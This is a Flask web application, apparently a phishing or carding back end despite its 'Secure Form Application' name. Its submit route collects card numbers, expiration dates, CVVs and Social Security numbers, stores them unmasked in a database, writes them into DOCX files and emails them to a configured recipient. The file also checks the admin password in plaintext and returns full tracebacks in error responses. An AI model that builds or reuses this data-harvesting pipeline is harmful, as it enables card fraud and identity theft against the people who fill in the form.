"""
Secure Form Application - Main Flask Application
"""
from flask import Flask, render_template, request, jsonify
from flask_wtf.csrf import CSRFProtect, generate_csrf, CSRFError
from config import Config
from models import db, FormSubmission
from sqlalchemy import text
from utils.validators import (
    validate_card_number, validate_expiration_date, 
    validate_cvv, validate_ssn, validate_name, sanitize_input
)
from utils.docx_generator import generate_submission_docx
from utils.email_service import init_mail, send_submission_email
from datetime import datetime
import logging
import os

# Initialize Flask app
app = Flask(__name__)
app.config.from_object(Config)
Config.init_app(app)

# Version for tracking
APP_VERSION = "1.3.4"

# Initialize extensions
db.init_app(app)
csrf = CSRFProtect(app)
init_mail(app)

@app.errorhandler(CSRFError)
def handle_csrf_error(e):
    logger.warning(f"CSRF Error: {e.description}")
    return jsonify({
        'success': False,
        'error': f'Security Error: {e.description}. Please refresh the page.',
        'is_csrf': True
    }), 400

# Register blueprints
from admin import admin_bp, login_required
app.register_blueprint(admin_bp)

@app.route('/login/', methods=['GET', 'POST'])
def login_admin():
    """Admin login page at top-level /login/"""
    from flask import session, redirect, url_for, flash, current_app
    
    if session.get('admin_logged_in'):
        return redirect(url_for('admin.dashboard'))
        
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        admin_username = current_app.config.get('ADMIN_USERNAME')
        admin_password = current_app.config.get('ADMIN_PASSWORD')
        
        if username == admin_username and password == admin_password:
            session['admin_logged_in'] = True
            session['admin_username'] = username
            flash('Successfully logged in!', 'success')
            return redirect(url_for('admin.dashboard'))
        else:
            flash('Invalid credentials. Please try again.', 'error')
    
    return render_template('admin/login.html')

@app.route('/admin/login')
def legacy_login_redirect():
    """Redirect old login URL to new one"""
    return redirect(url_for('login_admin'))

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Create database tables
with app.app_context():
    try:
        db.create_all()
        logger.info("Database tables created successfully")
    except Exception as e:
        logger.error(f"Error creating database tables: {e}")

@app.context_processor
def inject_version():
    """Inject version into all templates"""
    return dict(version=APP_VERSION)

@app.route('/')
def index():
    """Render the main form page with version for cache busting and force reload"""
    from flask import make_response
    response = make_response(render_template('index.html'))
    # EXPLICIT CACHE BUSTING HEADERS
    response.headers['Cache-Control'] = 'no-cache, no-store, must-revalidate, post-check=0, pre-check=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '0'
    return response

@app.route('/favicon.ico')
def favicon():
    """Return empty response for favicon to prevent 404s"""
    return '', 204

@app.route('/version')
def get_version():
    """Return application version"""
    return jsonify({
        'version': APP_VERSION,
        'status': 'active',
        'environment': os.getenv('FLASK_ENV', 'unknown')
    })

@app.route('/submit', methods=['POST'])
def submit_form():
    """
    Handle form submission
    
    Expected JSON payload:
    {
        "name_on_card": str,
        "card_type": str,
        "card_number": str,
        "expiration_date": str,
        "cvv": str,
        "ssn": str
    }
    
    Returns:
        JSON response with success/error status
    """
    try:
        # Get JSON data
        data = request.get_json()
        
        if not data:
            logger.warning("Submission attempt with NO DATA")
            return jsonify({
                'success': False,
                'error': 'No data provided'
            }), 400
        
        logger.info(f"Received submission data: { {k: (v if k not in ['card_number', 'cvv', 'ssn'] else '***') for k, v in data.items()} }")
        
        # Extract and sanitize form fields
        name_on_card = sanitize_input(data.get('name_on_card', ''))
        card_type = sanitize_input(data.get('card_type', ''))
        card_number = sanitize_input(data.get('card_number', ''))
        expiration_date = sanitize_input(data.get('expiration_date', ''))
        cvv = sanitize_input(data.get('cvv', ''))
        ssn = sanitize_input(data.get('ssn', ''))
        
        # Validate all fields
        errors = {}
        
        # Validate name
        is_valid, error_msg = validate_name(name_on_card)
        if not is_valid:
            errors['name_on_card'] = error_msg
        
        # Validate card type
        if card_type not in ['Credit Card', 'Debit Card']:
            errors['card_type'] = 'Please select a valid card type'
        
        # Validate card number
        is_valid, error_msg = validate_card_number(card_number)
        if not is_valid:
            errors['card_number'] = error_msg
        
        # Validate expiration date
        is_valid, error_msg = validate_expiration_date(expiration_date)
        if not is_valid:
            errors['expiration_date'] = error_msg
        
        # Validate CVV
        is_valid, error_msg = validate_cvv(cvv, card_type)
        if not is_valid:
            errors['cvv'] = error_msg
        
        # Validate SSN
        is_valid, error_msg = validate_ssn(ssn)
        if not is_valid:
            errors['ssn'] = error_msg
        
        # If there are validation errors, return them
        if errors:
            logger.warning(f"VALIDATION FAILED (400): {errors}")
            logger.debug(f"Raw data that failed: { {k: (v if k not in ['card_number', 'cvv', 'ssn'] else '***') for k, v in data.items()} }")
            return jsonify({
                'success': False,
                'error': 'Form validation failed. Please check the highlighted fields.',
                'errors': errors
            }), 400
        
        # Get client IP address
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        # Create new submission in database
        submission = FormSubmission(
            name_on_card=name_on_card,
            card_type=card_type,
            card_number=card_number,
            expiration_date=expiration_date,
            cvv=cvv,
            ssn=ssn,
            ip_address=ip_address
        )
        
        db.session.add(submission)
        db.session.commit()
        
        logger.info(f"New submission created with ID: {submission.id}")
        
        # Stage 2: Generate DOCX document
        docx_path = None
        try:
            logger.info("Attempting to generate DOCX...")
            # Use data directly or to_dict()
            sub_data = submission.to_dict()
            docx_path = generate_submission_docx(sub_data, submission.id)
            submission.docx_filename = docx_path.name
            
            # Store document in database as well
            with open(docx_path, 'rb') as doc_file:
                submission.document_data = doc_file.read()
            
            db.session.commit()
            logger.info(f"DOCX generated and stored successfully: {docx_path.name}")
        except Exception as e:
            logger.error(f"NON-CRITICAL: Error during DOCX generation: {str(e)}")
            import traceback
            logger.error(traceback.format_exc())
            # We DON'T crash here. The data is already in DB.
        
        # Stage 3: Send email notification
        try:
            logger.info("Attempting to send email...")
            success, message = send_submission_email(submission.to_dict(), docx_path)
            if success:
                # We mark as sent tentatively because it's now in a thread
                submission.email_sent = True
                submission.email_sent_at = datetime.utcnow()
                db.session.commit()
                logger.info(f"Email background task started for submission {submission.id}")
            else:
                logger.warning(f"Email task NOT started for submission {submission.id}: {message}")
        except Exception as e:
            logger.error(f"NON-CRITICAL: Global error in email sending flow: {str(e)}")
            import traceback
            logger.error(traceback.format_exc())
            # We DON'T crash here.
        
        logger.info(f"Submission {submission.id} completed successfully (from server perspective)")
        # Stage 4: Final Success Response
        logger.info(f"Preparing success response for submission {submission.id}")
        
        # Super safe confirmation number
        try:
            conf_num = f"CONF-{int(submission.id):06d}"
        except:
            conf_num = f"CONF-{submission.id}"

        return jsonify({
            'success': True,
            'version': APP_VERSION,
            'message': 'Form submitted successfully!',
            'submission_id': submission.id,
            'confirmation_number': conf_num
        }), 200
        
    except Exception as e:
        import traceback
        error_details = traceback.format_exc()
        logger.error(f"FATAL ERROR in submit_form route: {error_details}")
        try:
            db.session.rollback()
        except:
            pass
        
        return jsonify({
            'success': False,
            'version': APP_VERSION,
            'error': f'Server Error ({e.__class__.__name__}): {str(e)}',
            'details': error_details
        }), 500

@app.route('/test-email')
@csrf.exempt # Exempt for easy testing
def test_email():
    """Synchronous email test to see errors directly on screen"""
    from utils.email_service import send_via_resend
    
    resend_key = app.config.get('RESEND_API_KEY')
    recipient = app.config.get('MAIL_RECIPIENT')
    
    if not resend_key:
        return "ERROR: RESEND_API_KEY is missing in Railway Variables", 400
    if not recipient:
        return "ERROR: MAIL_RECIPIENT is missing in Railway Variables", 400
        
    logger.info(f"TEST EMAIL: Sending to {recipient}...")
    success, message = send_via_resend(
        api_key=resend_key,
        from_email="onboarding@resend.dev",
        to_email=recipient,
        subject="Resend Test Connection",
        html_content="<h1>Connection Successful!</h1><p>If you see this, the Resend API is working perfectly.</p>"
    )
    
    if success:
        return f"SUCCESS: Email sent to {recipient}. Please check your inbox (and SPAM)!", 200
    else:
        return f"FAILED: Resend API says: {message}", 500

@app.route('/health')
def health():
    """Detailed health check for Railway diagnostics"""
    import socket
    diagnostics = {
        'status': 'healthy',
        'database': 'disconnected',
        'storage': 'unknown',
        'network': {}
    }
    
    # Check database
    try:
        db.session.execute(text('SELECT 1'))
        diagnostics['database'] = 'connected'
    except Exception as e:
        diagnostics['status'] = 'unhealthy'
        diagnostics['database'] = f'error: {str(e)}'
        
    # Check storage
    try:
        test_file = Config.SUBMISSIONS_FOLDER / 'test_write.txt'
        test_file.write_text('test')
        test_file.unlink()
        diagnostics['storage'] = 'writable'
    except Exception as e:
        diagnostics['storage'] = f'error: {str(e)}'
        
    # HTTP Outbound Test (Essential for Resend API)
    try:
        s2 = socket.create_connection(("google.com", 443), timeout=3)
        s2.close()
        diagnostics['network']['http_outbound'] = "connected to google.com:443"
    except Exception as e:
        diagnostics['network']['http_outbound'] = f"failed: {str(e)}"

    # Resend API Check (Preferred for Cloud)
    resend_key = app.config.get('RESEND_API_KEY')
    if resend_key:
        try:
            s_res = socket.create_connection(("api.resend.com", 443), timeout=3)
            s_res.close()
            diagnostics['network']['resend_api'] = "connected to api.resend.com:443"
        except Exception as e:
            diagnostics['network']['resend_api'] = f"failed: {str(e)}"
    else:
        diagnostics['network']['resend_api'] = "API Key Missing"

    # FINAL STATUS LOGIC: 
    # Since Railway blocks SMTP, we ONLY care about the Resend API.
    # We DO NOT check SMTP anymore to avoid confusing Error 101 logs.
    if diagnostics['network'].get('resend_api') == "connected to api.resend.com:443":
        diagnostics['status'] = 'healthy'
    else:
        # If API key is missing or API is down, it's degraded
        diagnostics['status'] = 'degraded'

    return jsonify(diagnostics), 200 if diagnostics['status'] == 'healthy' else 500

@app.after_request
def set_csrf_cookie(response):
    """Set CSRF cookie for client-side access if needed"""
    response.set_cookie('csrf_token', generate_csrf())
    return response

@app.errorhandler(404)
def not_found(error):
    """Handle 404 errors"""
    return jsonify({'error': 'Not found'}), 404

@app.errorhandler(500)
def internal_error(error):
    """Handle 500 errors"""
    logger.error(f"Internal error: {str(error)}")
    return jsonify({'error': 'Internal server error'}), 500

if __name__ == '__main__':
    # Run the application
    app.run(
        host='0.0.0.0',
        port=5000,
        debug=app.config['DEBUG']
    )
